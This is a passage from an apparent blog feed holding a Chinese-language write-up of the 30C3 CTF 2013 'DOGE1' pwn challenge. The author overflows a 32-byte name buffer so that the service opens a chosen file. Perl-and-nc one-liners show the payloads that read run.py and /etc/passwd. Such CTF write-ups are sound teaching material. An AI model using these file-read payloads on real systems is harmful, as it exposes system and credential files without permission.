+&lt;p&gt;flag: &lt;code&gt;7hE_0w15_4R3_n07_wh47_7h3Y_533m--7hEr3_15_4_m4n_1n_a_5m111n9_649&lt;/code&gt;  &lt;/p&gt;</content><category term="Other CTF"></category><category term="Jailbreak"></category></entry><entry><title>30C3CTF 2013 PWN 100 DOGE1</title><link href="https://ddaa.tw/30c3ctf_2013_pwn_100_doge1.html" rel="alternate"></link><published>2013-12-30T21:25:00+08:00</published><updated>2013-12-30T21:25:00+08:00</updated><author><name>ddaa</name></author><id>tag:ddaa.tw,2013-12-30:/30c3ctf_2013_pwn_100_doge1.html</id><summary type="html">&lt;p&gt;這次都沒有人陪打 QQ&lt;br&gt;
+只解兩題 100 分...真慘&lt;br&gt;
+不過這題 100 分，跟另一題的難度也差太多了吧 = =  &lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;先用 nc 連線過去，要求我們輸入名稱，然後就看到一隻...豬頭?&lt;br&gt;
+提示有兩個指令好用: &lt;code&gt;feed&lt;/code&gt;, &lt;code&gt;show&lt;/code&gt;&lt;br&gt;
+&lt;code&gt;show&lt;/code&gt; 是再印一次豬頭，&lt;code&gt;feed&lt;/code&gt; 也差不多，奇怪的功能 = =&lt;br&gt;
+&lt;img alt="doge1.png" src="https://ddaa.tw/images/30c3CTF_2013_doge_1.png"&gt;  &lt;/p&gt;
+&lt;p&gt;假如不輸入 &lt;code&gt;feed&lt;/code&gt; 或 &lt;code&gt;show&lt;/code&gt;，試著輸入長字串，毫無反應 Orz&lt;br&gt;
+試試看輸入超長名稱....沒有印出那顆豬頭了 XD  &lt;/p&gt;
+&lt;p&gt;這題有提供原始程式，資料夾底下有三個檔案:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;ascii_art_doge_color.txt&lt;/li&gt;
+&lt;li&gt;doge.so&lt;/li&gt;
+&lt;li&gt;run.py&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;em&gt;ascii_art_doge_color.txt&lt;/em&gt; 就是那隻豬頭的 ascii 圖檔&lt;br&gt;
+&lt;em&gt;run.py&lt;/em&gt; 只有 …&lt;/p&gt;</summary><content type="html">&lt;p&gt;這次都沒有人陪打 QQ&lt;br&gt;
+只解兩題 100 分...真慘&lt;br&gt;
+不過這題 100 分，跟另一題的難度也差太多了吧 = =  &lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;先用 nc 連線過去，要求我們輸入名稱，然後就看到一隻...豬頭?&lt;br&gt;
+提示有兩個指令好用: &lt;code&gt;feed&lt;/code&gt;, &lt;code&gt;show&lt;/code&gt;&lt;br&gt;
+&lt;code&gt;show&lt;/code&gt; 是再印一次豬頭，&lt;code&gt;feed&lt;/code&gt; 也差不多，奇怪的功能 = =&lt;br&gt;
+&lt;img alt="doge1.png" src="https://ddaa.tw/images/30c3CTF_2013_doge_1.png"&gt;  &lt;/p&gt;
+&lt;p&gt;假如不輸入 &lt;code&gt;feed&lt;/code&gt; 或 &lt;code&gt;show&lt;/code&gt;，試著輸入長字串，毫無反應 Orz&lt;br&gt;
+試試看輸入超長名稱....沒有印出那顆豬頭了 XD  &lt;/p&gt;
+&lt;p&gt;這題有提供原始程式，資料夾底下有三個檔案:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;ascii_art_doge_color.txt&lt;/li&gt;
+&lt;li&gt;doge.so&lt;/li&gt;
+&lt;li&gt;run.py&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;em&gt;ascii_art_doge_color.txt&lt;/em&gt; 就是那隻豬頭的 ascii 圖檔&lt;br&gt;
+&lt;em&gt;run.py&lt;/em&gt; 只有：  &lt;/p&gt;
+&lt;table class="highlighttable"&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1
+2
+3
+4
+5&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/usr/bin/env python&lt;/span&gt;
+&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;signal&lt;/span&gt;
+&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;doge&lt;/span&gt;
+&lt;span class="n"&gt;signal&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;signal&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;signal&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SIGCHLD&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;signal&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SIG_IGN&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;doge&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;listen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;0.0.0.0&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1024&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+
+&lt;p&gt;&lt;em&gt;doge.so&lt;/em&gt; 是編譯過的 linux library&lt;br&gt;
+執行起來，並且輸入長字串看看結果，結果 server 端有噴出錯誤訊息  &lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;...&lt;br&gt;
+File "doge.pyx", line 54, in doge.Doge.__str__ (doge.c:1875)&lt;br&gt;
+IOError: [Errno 2] No such file or directory: 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'  &lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;看來是發生 bof 了 XD&lt;br&gt;
+繼續試一下前面塞多少才會蓋到，結果是 "a"x32&lt;br&gt;
+&lt;code&gt;perl -e 'print "a"x32 . "test"' | nc 0 1024&lt;/code&gt;  &lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;...&lt;br&gt;
+File "doge.pyx", line 54, in doge.Doge.&lt;strong&gt;str&lt;/strong&gt; (doge.c:1875)&lt;br&gt;
+IOError: [Errno 2] No such file or directory: 'testi_art_doge_color.txt'  &lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;試試看能不能成功讀檔：
+&lt;code&gt;perl -e 'print "a"x32 . "run.py\x00"' | nc 0 1024&lt;/code&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Dogename: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaarun.py#!/usr/bin/env python&lt;br&gt;
+import signal&lt;br&gt;
+import doge&lt;br&gt;
+signal.signal(signal.SIGCHLD, signal.SIG_IGN)&lt;br&gt;
+doge.listen("0.0.0.0", 1024)&lt;br&gt;
+commands: feed, show  &lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;接下來就是猜猜看了...試了幾個檔案像是 &lt;em&gt;flag&lt;/em&gt; , &lt;em&gt;flag.txt&lt;/em&gt; , &lt;em&gt;key&lt;/em&gt; , &lt;em&gt;key.txt&lt;/em&gt; ...都失敗了 = =&lt;br&gt;
+最後猜到 &lt;em&gt;/etc/passwd&lt;/em&gt;&lt;br&gt;
+&lt;img alt="flag.png" src="https://ddaa.tw/images/30c3CTF_2013_doge_flag.png"&gt;&lt;/p&gt;
+&lt;p&gt;flag: &lt;code&gt;30C3_51dd250e0adb864ff40cc40b818852f4&lt;/code&gt;&lt;/p&gt;</content><category term="3XC3CTF"></category><category term="Stack Overflow"></category></entry></feed>
